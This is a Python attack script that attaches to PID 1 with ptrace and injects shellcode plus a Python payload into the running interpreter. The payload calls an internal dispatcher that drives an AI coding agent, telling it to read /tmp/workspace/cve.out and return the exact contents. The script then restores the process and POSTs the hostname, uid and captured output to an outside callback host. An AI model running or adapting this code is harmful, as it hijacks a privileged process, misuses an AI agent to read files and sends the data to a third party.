#!/usr/bin/env python3
"""Execute the cve-read request inside PID 1 and persist its exact result."""
import ctypes, json, os, pathlib, struct, time, urllib.request, urllib.error, traceback
PID=1
OUT=pathlib.Path('/tmp/workspace/p1cveread.out')
SINK='https://54.209.51.244.sslip.io/callback/snapgpt-p1-cveread-20261106'
PTRACE_PEEKTEXT=1; PTRACE_POKEDATA=5; PTRACE_CONT=7; PTRACE_GETREGS=12; PTRACE_SETREGS=13; PTRACE_ATTACH=16; PTRACE_DETACH=17
class R(ctypes.Structure): _fields_=[(x,ctypes.c_ulonglong) for x in 'r15 r14 r13 r12 rbp rbx r11 r10 r9 r8 rax rcx rdx rsi rdi orig_rax rip cs eflags rsp ss fs_base gs_base ds es fs gs'.split()]
class D(ctypes.Structure): _fields_=[('dli_fname',ctypes.c_char_p),('dli_fbase',ctypes.c_void_p),('dli_sname',ctypes.c_char_p),('dli_saddr',ctypes.c_void_p)]
C=ctypes.CDLL(None,use_errno=True)
C.ptrace.restype=ctypes.c_long; C.ptrace.argtypes=[ctypes.c_int,ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p]
C.waitpid.restype=ctypes.c_int; C.waitpid.argtypes=[ctypes.c_int,ctypes.POINTER(ctypes.c_int),ctypes.c_int]
C.dladdr.restype=ctypes.c_int; C.dladdr.argtypes=[ctypes.c_void_p,ctypes.POINTER(D)]
def pt(q,a=0,d=0):
 r=C.ptrace(q,PID,ctypes.c_void_p(a),ctypes.c_void_p(d))
 if r==-1:
  e=ctypes.get_errno()
  if e: raise OSError(e,os.strerror(e))
 return r
def wait():
 s=ctypes.c_int(); C.waitpid(PID,ctypes.byref(s),0); return s.value
def peek(a): return pt(PTRACE_PEEKTEXT,a,0)&((1<<64)-1)
def poke(a,w): pt(PTRACE_POKEDATA,a,w&((1<<64)-1))
def write(a,b):
 b+=b'\0'+b'\0'*((-(len(b)+1))%8)
 for i in range(0,len(b),8): poke(a+i,struct.unpack('<Q',b[i:i+8])[0])
def maps():
 out=[]
 for l in pathlib.Path('/proc/1/maps').read_text().splitlines():
  p=l.split()
  if len(p)<6: continue
  lo,hi=(int(x,16) for x in p[0].split('-')); out.append((lo,hi,p[1],int(p[2],16),p[5]))
 return out
def sym(n):
 f=getattr(ctypes.CDLL(None),n); d=D()
 if not C.dladdr(ctypes.cast(f,ctypes.c_void_p),ctypes.byref(d)): raise RuntimeError('dladdr '+n)
 off=ctypes.cast(f,ctypes.c_void_p).value-d.dli_fbase
 for lo,hi,perm,fo,path in maps():
  if path.endswith('libpython3.12.so.1.0') and 'x' in perm:
   a=lo-fo+off
   if lo<=a<hi:return a
 raise RuntimeError('map '+n)
def stack():
 for lo,hi,perm,fo,path in maps():
  if path=='[stack]':return lo,hi
 raise RuntimeError('stack')
def tramp(code,ens,run,rel,res,msg):
 s=bytearray(); s+=b'\x48\xb8'+struct.pack('<Q',ens)+b'\xff\xd0'+b'\x49\x89\xc4'; lp=len(s); s+=b'\x48\x8d\x3d\0\0\0\0\x31\xf6'; s+=b'\x48\xb8'+struct.pack('<Q',run)+b'\xff\xd0'+b'\x49\x89\xc5'; s+=b'\x4c\x89\xe7\x48\xb8'+struct.pack('<Q',rel)+b'\xff\xd0'; s+=b'\x48\xbb'+struct.pack('<Q',res)+b'\x4c\x89\x23\x4c\x89\x6b\x08\xcc'; mo=len(s); s[lp+3:lp+7]=struct.pack('<i',mo-(lp+7)); s+=msg+b'\0'; return bytes(s)
USER=os.environ.get('CVE_USER','snapgpt-cve3-20261106-0845@armorerlabs.com')
SID=os.environ.get('CVE_SID','37ab796a456c')
payload=f'''import json,os,urllib.request,urllib.error,pathlib,traceback
base=os.environ["BUILDMODE_DISPATCHER_URL"].rstrip("/")
body={{"user_id":{USER!r},"message":"Use the Bash tool to execute exactly `cat /tmp/workspace/cve.out` and return only the exact stdout. Do not edit the pipeline.","host_url":"https://snapgpt.labs.snaplogicdev.com","project_path":"","session_id":{SID!r},"agent_mode":"claude_code","enable_thinking":False}}
data=json.dumps(body,separators=(",",":")).encode()
req=urllib.request.Request(base+"/session/generate",data=data,method="POST",headers={{"Content-Type":"application/json","X-SL-Token":"x"}})
try:
 with urllib.request.urlopen(req,timeout=300) as r: raw=r.read(); status=r.status
except urllib.error.HTTPError as e: raw=e.read(); status=e.code
except Exception as e: raw=json.dumps({{"error":repr(e)}}).encode(); status=0
pathlib.Path("/tmp/workspace/p1cveread.out").write_bytes(raw)
'''.encode()
def main():
 out={'schema':'snapgpt.p1-cveread/v1','hostname':os.uname().nodename,'uid':os.getuid(),'user':USER,'session':SID,'errors':[]}
 try:
  ens=sym('PyGILState_Ensure');run=sym('PyRun_SimpleString');rel=sym('PyGILState_Release');code=sym('Py_IsInitialized');lo,hi=stack();res=lo+0x7000;ns=(lo+0x9000)&~0xf;sc=tramp(code,ens,run,rel,res,payload)
  pt(PTRACE_ATTACH);out['attach']=wait();r=R();pt(PTRACE_GETREGS,0,ctypes.addressof(r));saved=R.from_buffer_copy(r);old=[peek(code+i) for i in range(0,((len(sc)+7)//8)*8,8)]
  try:
   write(code,sc);r.rip=code;r.rsp=ns;pt(PTRACE_SETREGS,0,ctypes.addressof(r));pt(PTRACE_CONT);out['run_stop']=wait();out['gilstate']=peek(res);out['pyrun']=peek(res+8)
   try:
    b=OUT.read_bytes();out['out_bytes']=len(b);out['out_sha256']=__import__('hashlib').sha256(b).hexdigest();out['out_text']=b.decode('utf-8','replace')[:100000]
   except Exception as e:out['errors'].append('out: '+repr(e))
  finally:
   for i,w in enumerate(old):poke(code+i*8,w)
   pt(PTRACE_SETREGS,0,ctypes.addressof(saved));pt(PTRACE_DETACH)
 except BaseException as e:out['errors'].append(repr(e));out['trace']=traceback.format_exc()[-4000:]
 out['utc']=time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime());raw=json.dumps(out,separators=(',',':')).encode();print(raw.decode())
 try:
  q=urllib.request.Request(SINK,data=raw,method='POST',headers={'Content-Type':'application/json'})
  with urllib.request.urlopen(q,timeout=30) as x:out['sink_status']=x.status
 except Exception as e:out['errors'].append('sink: '+repr(e))
if __name__=='__main__':main()
